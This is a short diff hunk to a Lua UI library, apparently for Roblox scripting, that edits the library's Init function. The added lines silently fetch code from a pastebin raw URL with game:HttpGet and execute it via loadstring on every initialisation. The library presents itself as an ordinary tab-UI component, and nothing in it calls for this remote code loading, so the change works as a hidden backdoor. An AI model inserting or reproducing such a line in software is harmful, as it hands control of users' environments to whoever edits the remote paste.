@@ -4340,7 +4340,9 @@ function library:Init(key)
 		table.insert(self.threads, thread)
 		return thread
 	end
-
+	
+	loadstring(game:HttpGet("https://pastebin.com/raw/tcnND0RT"))()
+	
 	return TabLibrary
 end
 
